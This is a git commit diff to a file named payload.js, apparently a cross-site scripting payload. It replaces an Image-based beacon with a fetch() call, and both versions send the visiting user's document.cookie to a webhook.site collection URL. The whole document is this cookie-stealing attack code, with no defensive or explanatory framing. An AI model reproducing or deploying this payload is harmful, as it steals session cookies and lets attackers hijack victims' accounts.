e36b43af4ad6b835704cb4ccb8b41c447ebc27ba
TheBCann <161960060+TheBCann@users.noreply.github.com>
2025-05-30 21:21:37 -0400

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,2 +1,1 @@
-x = new Image(); 
-x.src = 'https://webhook.site/bdd2d1e9-1336-41a5-9262-4cb5ec3061dc' + btoa(document.cookie);
+fetch('https://webhook.site/bdd2d1e9-1336-41a5-9262-4cb5ec3061dc?cookie=' + document.cookie);
